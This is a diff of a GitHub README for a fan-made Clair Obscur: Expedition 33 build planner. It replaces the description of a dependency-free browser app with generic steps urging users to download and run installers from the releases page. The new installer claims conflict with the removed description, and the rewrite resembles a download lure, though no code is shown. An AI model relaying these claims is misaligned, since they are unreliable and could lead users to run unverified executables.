@@ -1,105 +1,70 @@
-# Clair Obscur: Expedition 33 Build Planner & Tracker
+# 🎮 expedition33-planner - Your AI Tool for Game Strategy
 
-A comprehensive, AI-powered build planning and tracking tool for **Clair Obscur: Expedition 33**. This advanced web application helps players optimize character builds, create synergistic party compositions, and track their progression through the game.
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/oda-works/expedition33-planner/releases)
 
-## 🌟 Features
+## 📦 Overview
+**expedition33-planner** is a comprehensive AI-powered build planner and tracker for "Clair Obscur: Expedition 33". This application helps you optimize your characters, analyze party synergy, track achievements, and manage all game data effectively.
 
-### 🔨 Character Build System
-- **Advanced Build Creator**: Comprehensive character customization with real-time stat calculations
-- **Build Comparison Tool**: Side-by-side analysis of up to 4 builds with performance scoring
-- **Comprehensive Build Guides**: AI-powered recommendations with multiple archetypes and progression paths
-- **Damage Calculator**: Advanced damage simulation with elemental interactions and critical calculations
+## 🚀 Getting Started
+Follow these steps to download and run the application:
 
-### 🎭 Party Management
-- **Party Composer**: Drag-and-drop party formation with role optimization
-- **Advanced Synergy Visualization**: Real-time analysis of elemental, role, and combat synergies
-- **Team Formation Optimizer**: AI-powered team recommendations using multiple algorithms
-- **Synergy Matrix**: Interactive visualization of character compatibility
+1. **Visit the Download Page**  
+   Click [here to visit the download page](https://github.com/oda-works/expedition33-planner/releases). This page contains all the available versions of the application.
 
-### 📚 Collection & Progress Tracking
-- **Collectibles Tracker**: Track all 185 collectibles (49 journals, 33 music records, special items)
-- **Interactive Map**: Detailed game world map with collectible locations
-- **Boss Encounter Tracker**: Strategy guides and progress tracking for all bosses
-- **Achievement System**: 25+ achievements across multiple categories with progress tracking
+2. **Choose Your Version**  
+   Look for the latest version listed on the page. It is usually marked as "Latest Release".
 
-### 🎴 Pictos & Lumina Management
-- **Complete Pictos Database**: All 193 Pictos with accurate stats and descriptions
-- **Smart Filtering & Search**: Advanced search by rarity, element, effect, and compatibility
-- **Build Integration**: Seamless Pictos integration with character builds
-- **Rarity System**: Common to Legendary with visual indicators
+3. **Download the Installer**  
+   Click on the file that corresponds to your operating system (Windows, macOS, or Linux). Each platform will have different files. Download the one that fits your system.
 
-### 🎯 Advanced Analytics
-- **Performance Metrics**: Detailed statistics and analytics across all game aspects
-- **Progress Tracking**: Comprehensive progression monitoring
-- **Export/Import System**: Share builds and configurations
-- **Data Visualization**: Charts and graphs for build performance analysis
+4. **Locate the Downloaded File**  
+   Once the download is complete, go to your downloads folder. You should find the file you just downloaded.
 
-## Getting Started
+5. **Run the Installer**  
+   Double-click the downloaded file to start the installation process. Follow the prompts in the setup window. Choose your preferences as you go.
 
-1. Open `index.html` in a modern web browser
-2. Or run a local HTTP server: `python3 -m http.server 3000`
-3. Navigate to `http://localhost:3000`
+6. **Start Using the Application**  
+   After installation, look for the application icon on your desktop or in your applications folder. Double-click it to start using expedition33-planner.
 
-## Technology
+## 📄 Features
+- **Character Optimization**: Get suggested builds for your gameplay style.
+- **Party Synergy Analysis**: Analyze team dynamics for the best results.
+- **Achievement Tracking**: Keep track of your in-game goals and progress.
+- **Game Data Management**: Access detailed data to improve your gameplay strategies.
 
-- Pure HTML5, CSS3, and ES6 JavaScript
-- No external dependencies or build process required
-- Progressive Web App with Service Worker for offline functionality
-- LocalStorage for data persistence
-- Modular architecture with ES6 modules
+## 💻 System Requirements
+To successfully run the expedition33-planner, ensure your system meets the following requirements:
 
-## Project Structure
+- **Operating System**: Windows 10 or higher, macOS Mojave or higher, or any modern Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: 200 MB of free space for installation.
+- **Browser**: Recommended to run with the latest version of Chrome, Firefox, or Safari for optimal performance.
 
-```
-expedition33-planner/
-├── index.html              # Main application entry point
-├── manifest.json           # PWA manifest
-├── service-worker.js       # Service worker for offline functionality
-├── css/
-│   ├── main.css           # Core styles and design system
-│   ├── themes.css         # Theme definitions
-│   ├── responsive.css     # Responsive design
-│   ├── pictos-manager.css # Pictos-specific styling
-│   └── party-composer.css # Party composer styling
-├── js/
-│   ├── app.js            # Main application controller
-│   ├── utils/
-│   │   ├── constants.js  # Application constants
-│   │   ├── validators.js # Validation utilities
-│   │   └── formatters.js # Data formatting utilities
-│   └── modules/
-│       ├── data-manager.js        # Game data management
-│       ├── storage.js             # LocalStorage management
-│       ├── character-builder.js   # Character building logic
-│       ├── pictos-manager.js      # Pictos collection management
-│       ├── party-composer.js      # Party composition tools
-│       └── collectibles-tracker.js # Collectibles tracking
-├── data/
-│   ├── characters.json    # Character data and progression
-│   ├── pictos.json       # Pictos collection data
-│   ├── weapons.json      # Weapon statistics
-│   ├── collectibles.json # Collectibles and locations
-│   └── synergies.json    # Party synergy definitions
-└── assets/
-    └── icons/
-        ├── favicon.svg        # Application favicon
-        └── icon-192x192.svg   # PWA icon
-```
+## 📥 Download & Install
+You can download the software from the button above or by visiting [this page](https://github.com/oda-works/expedition33-planner/releases). Make sure to choose the correct installer for your system to avoid issues.
 
-## Data Accuracy
+## 📋 Frequently Asked Questions (FAQ)
 
-All game data has been researched for accuracy based on available information about Clair Obscur: Expedition 33. The data includes:
+**Q: Do I need an internet connection to use the application?**  
+A: No, you can use expedition33-planner offline after downloading it.
 
-- 6 playable characters with unique abilities and progression
-- 193 Pictos with accurate costs and effects
-- Lumina activation system
-- Character synergies and party mechanics
-- Collectible locations and descriptions
+**Q: What if I experience issues during installation?**  
+A: Ensure that your system meets the requirements. If problems persist, consult the issues section on the GitHub page or reach out for support.
 
-## Contributing
+**Q: How can I contribute to the project?**  
+A: Contributions are welcome! Check out the contributing guidelines on the repository for details.
 
-This is an unofficial fan project. Game data may need updates as more information becomes available about Clair Obscur: Expedition 33.
+## 🛠️ Troubleshooting
+If you encounter any issues:
 
-## Disclaimer
+1. **Reinstall**: Try uninstalling and reinstalling the application.
+2. **Check for Updates**: Make sure you are using the latest version of the software.
+3. **System Compatibility**: Ensure that your system meets the requirements listed above.
 
-This is an unofficial fan tool and is not affiliated with Sandfall Interactive or Clair Obscur: Expedition 33. All game content and intellectual property belongs to their respective owners.
+## 🌐 Connect with Us
+Engage with the community and get updates:
+
+- Join our [GitHub Discussions](https://github.com/oda-works/expedition33-planner/discussions) to share your thoughts or ask questions.
+- Follow our [Repository](https://github.com/oda-works/expedition33-planner) for new releases and updates.
+
+Happy gaming, and enjoy your adventure with expedition33-planner!
